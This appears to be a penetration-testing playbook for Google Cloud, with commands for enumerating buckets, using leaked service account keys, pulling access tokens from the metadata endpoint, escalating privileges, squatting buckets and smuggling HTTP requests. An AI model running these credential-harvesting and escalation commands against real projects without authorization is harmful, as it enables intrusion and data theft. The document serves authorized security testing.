---
name: gcp
category: cloud
description: GCP security testing covering Cloud Storage buckets, service account keys, metadata endpoint, Firebase misconfig, and Compute Engine access
depends_on: []
---

# GCP Security Testing

Security testing for Google Cloud Platform applications and infrastructure. Focus on Cloud Storage bucket enumeration, service account key exposure, metadata endpoint exploitation, Firebase misconfiguration, and Compute Engine access.

## When to Use

- Target application is hosted on GCP (Compute Engine, GKE, Cloud Run, App Engine, Cloud Functions)
- GCS bucket names discovered during recon (storage.googleapis.com, *.storage.cloud.google.com)
- Firebase project identified (*.firebaseio.com, *.firebaseapp.com)
- SSRF or cloud metadata access is suspected on GCP infrastructure
- GCP service account keys or OAuth tokens found in source or responses

## Methodology

### 1. Cloud Storage Bucket Enumeration

**Discovery**
- Look for `storage.googleapis.com/{bucket}` or `{bucket}.storage.googleapis.com` in source
- Common patterns: `{project}-assets`, `{project}-uploads`, `{project}-backups`, `staging.{domain}`
- Check Firebase default bucket: `{project}.appspot.com`

**Access Testing**
```bash
# List bucket contents (anonymous)
curl "https://storage.googleapis.com/storage/v1/b/{bucket}/o"

# Read object directly
curl "https://storage.googleapis.com/{bucket}/{object}"

# Check bucket IAM policy
curl "https://storage.googleapis.com/storage/v1/b/{bucket}/iam"

# List buckets for a project (requires auth)
curl -H "Authorization: Bearer {token}" \
  "https://storage.googleapis.com/storage/v1/b?project={project}"
```

**ACL Issues**
- `allUsers` or `allAuthenticatedUsers` with read/write on buckets or objects
- Uniform bucket-level access not enforced (mixed ACL + IAM)
- Signed URL reuse: test across sessions, check expiration

### 2. Service Account Key Exposure

**Discovery**
- Search repos, CI/CD configs, Docker images for JSON key files
- Key file pattern: JSON with `type`, `project_id`, `private_key_id`, `private_key`, `client_email`
- Check environment variables: GOOGLE_APPLICATION_CREDENTIALS, GOOGLE_CLOUD_KEYFILE_JSON
- Inspect Cloud Function/Cloud Run source for embedded credentials

**Exploitation**
```bash
# Authenticate with discovered key
gcloud auth activate-service-account --key-file={key.json}

# Check identity and permissions
gcloud auth list
gcloud projects get-iam-policy {project}

# Enumerate accessible resources
gcloud storage ls
gcloud compute instances list
gcloud functions list
gcloud secrets list
```

**Privilege Escalation Paths**
- `iam.serviceAccountTokenCreator` on another SA: impersonate higher-privilege accounts
- `iam.serviceAccountKeyAdmin`: create new keys for any SA in the project
- `cloudfunctions.functions.create` + `iam.serviceAccounts.actAs`: deploy function as privileged SA
- `compute.instances.create` + `iam.serviceAccounts.actAs`: launch VM with privileged SA

### 3. Metadata Endpoint

**Compute Engine / GKE / Cloud Run**
```bash
# All requests require Metadata-Flavor header
# Access token for default service account
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"

# Service account email
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email"

# Project metadata (may contain SSH keys, startup scripts)
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/project/attributes/"

# Instance attributes and custom metadata
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/attributes/"

# Kubernetes credentials (GKE)
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env"
```

**Post-Token Actions**
- Use obtained access token with `gcloud` or `curl` against GCP APIs
- Check token scopes: `curl -H "Authorization: Bearer {token}" "https://www.googleapis.com/oauth2/v1/tokeninfo?access_token={token}"`
- Enumerate resources based on granted scopes

### 4. Firebase Misconfiguration

**Project Discovery**
- Extract config from JS bundle: `apiKey`, `authDomain`, `projectId`, `storageBucket`
- Realtime Database: `https://{project}.firebaseio.com/.json`
- Firestore REST: `https://firestore.googleapis.com/v1/projects/{project}/databases/(default)/documents/{collection}`

**Database Rules Testing**
```bash
# Realtime Database - anonymous read
curl "https://{project}.firebaseio.com/.json"

# Firestore - list documents (may require auth)
curl "https://firestore.googleapis.com/v1/projects/{project}/databases/(default)/documents/{collection}"

# Cloud Storage rules - default bucket
curl "https://firebasestorage.googleapis.com/v0/b/{project}.appspot.com/o"
```

**Common Issues**
- Realtime Database rules set to `".read": true` or `".write": true`
- Firestore rules allowing any authenticated user to read all collections
- Cloud Storage rules not restricting by user or path
- Cloud Functions trusting client-supplied UIDs instead of auth context
- API key unrestricted (no HTTP referrer or API restrictions)

### 5. Compute Engine Access

**If credentials obtained (metadata, key file, or token):**
```bash
# List instances
gcloud compute instances list

# Get instance details (check for startup scripts, metadata)
gcloud compute instances describe {instance} --zone={zone}

# Check firewall rules
gcloud compute firewall-rules list

# Serial port output (may contain boot logs, passwords)
gcloud compute instances get-serial-port-output {instance} --zone={zone}

# SSH via OS Login or metadata SSH keys
gcloud compute ssh {instance} --zone={zone}
```

**Startup Script Secrets**
- Metadata startup scripts often contain hardcoded credentials, API keys, or database connection strings
- Check both instance-level and project-level metadata

## Key Commands

```bash
# Authentication
gcloud auth activate-service-account --key-file={key.json}
gcloud auth print-access-token

# Discovery
gcloud projects list
gcloud services list --enabled
gcloud storage ls
gcloud compute instances list
gcloud functions list
gcloud run services list

# Secrets
gcloud secrets list
gcloud secrets versions access latest --secret={name}
```

## Validation

- Demonstrate unauthorized Cloud Storage access with sensitive data
- Show metadata endpoint token retrieval via SSRF and subsequent API access
- Prove Firebase database read/write without intended authorization
- Confirm service account key exploitation with resource enumeration
- Document exact commands, tokens used, and responses received

## Corpus-Derived Advanced Techniques

### Deterministic Resource Name Pre-Emption (Bucket Squatting)

Cloud services that auto-create infrastructure with predictable names are vulnerable to pre-emption:
```bash
# Identify naming patterns for auto-created resources
# GCS: {project}-assets, {project}-{region}-staging, {service}-{hash}
# Test: create the bucket/resource before the victim service does
gsutil mb gs://{predicted-bucket-name}
# If the service later trusts content from this bucket, you control it
```
Audit every cloud service's "first-run" or "auto-provision" flow for deterministic naming.

### GitHub Actions pwn-request on Public Repos

For every public GCP-related OSS repo with GitHub Actions:
```bash
# Audit workflow files for dangerous patterns
grep -rn 'pull_request_target\|workflow_run\|issue_comment' .github/workflows/
# Check: does the workflow checkout PR code AND have write permissions?
# Check: does it use secrets in a context reachable from PR-submitted code?
# Check: does it run PR-submitted code (build scripts, Makefiles, tests)?
```
`pull_request_target` with `actions/checkout@HEAD` of the PR branch is the classic RCE vector.

### Service Layer Authorization Boundary Confusion

When one GCP service is layered atop another (e.g., Container Registry over GCS, Cloud Functions over Cloud Run):
```bash
# Test: does the inner service enforce the same scopes as the outer?
# GCR example: GKE node may lack Cloud Storage scope but still access GCR
# because GCR uses GCS under the hood with different auth paths
gcloud container images list --repository=gcr.io/{project}
# If you have compute access but not storage scope, test GCR API directly
curl -H "Authorization: Bearer $(gcloud auth print-access-token)" \
  "https://gcr.io/v2/{project}/{image}/manifests/latest"
```

### HTTP Cache Poisoning via Parser Differentials

GCP load balancers and Cloud CDN may parse HTTP differently from the backend:
```bash
# Test bare CR injection (RFC 9112 violation)
printf 'GET / HTTP/1.1\r\nHost: target.tld\r\nX-Injected: true\rIgnored: yes\r\n\r\n' | nc target.tld 80
# Test CL/TE conflicts between Cloud Armor and backend
# Test HTTP/2 pseudo-header injection
curl --http2 -H ':method: GET /admin' https://target.tld/
```
Any discrepancy between what the CDN caches and what the origin serves is exploitable.

### Deprecated-But-Installed Subsystem Downgrade

When GCP migrates from feature A to feature B but A remains accessible:
```bash
# Example: GKE Metadata Concealment vs Workload Identity
# If legacy metadata API is still enabled alongside Workload Identity:
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
# The legacy endpoint may return a more privileged token
```
Test every configuration toggle that gates a deprecated subsystem.

### Cloud IDE and Dev Environment Attacks

Cloud IDEs expose a large attack surface through preview/render features:
```bash
# Test rendered content for XSS
# Markdown, HTML preview, SVG rendering, LaTeX, code-fence syntax highlighting
# Test: does the preview run in the same origin as the IDE?
# Test: can a malicious file in a repo trigger code execution in the IDE?
# Test: does the DevTools proxy expose auth tokens?
```

### Diff-Audit on OSS Library PRs

Monitor new PRs/commits to popular GCP client libraries for security-relevant changes:
```bash
# Watch for PRs that add path validation, sanitization, or access checks
# These PRs often fix vulnerabilities before CVEs are assigned
# Test the pre-fix code path against in-scope targets still running older versions
```

### Cloud Function / Cloud Run Metadata Egress

For any service that runs user-provided code on GCP infrastructure:
```bash
# First test: can you reach the metadata endpoint?
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
# Also test alternate metadata URLs:
curl -H "Metadata-Flavor: Google" "http://169.254.169.254/computeMetadata/v1/"
curl -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/"
```
Test from within: Cloud Functions, Cloud Run, Kaggle kernels, Colab, AI Platform notebooks, App Engine.
